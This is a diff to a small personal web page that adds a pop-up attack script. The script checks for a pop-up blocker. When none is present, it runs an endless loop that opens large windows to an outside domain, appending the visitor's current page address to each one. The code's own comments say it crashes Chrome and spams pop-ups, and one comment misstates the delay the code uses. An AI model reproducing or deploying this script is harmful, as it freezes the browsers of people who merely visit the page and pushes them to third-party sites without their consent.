@@ -1,7 +1,7 @@
 <html>
 
   <head>
-    <title>Jimmy T</title>
+    <title>Jimmy T + ATS</title>
     <link rel="stylesheet" type="text/css" href="index.css">
   </head>
 
@@ -16,12 +16,29 @@
 
     <script>
       function myFunction() {
-        window.open("http://kplibrary.cf");
+        function detectPopupBlocker() {
+          var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
+          if (!myTest) { // Tests for pop-up blocker ^
+            setTimeout(function() {
+              window.open("http://kplibrary.cf");
+            }, 200);
+            //Runs recursory code after 5000 millisecond delay ^ (crashes chrome)
+          } else {
+            myTest.close();
+            while (true) {
+              var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+              var URL = "http://hammyjam.ga" + location.href;
+              var win = window.open(URL, "_blank", strWindowFeatures);
+              //If no pop-up blocker spams a shit ton of pop-ups
+            }
+          }
+        }
+        detectPopupBlocker();
       }
 
     </script>
 
-    <font size="200" color="red">мα∂є ву נσмму тιмв(hElPeD bY aTs)</font>
+    <font size="200" color="red">мα∂є ву נσмму тιмв(hElPeD bY ATS)</font>
     </div>
   </body>
 
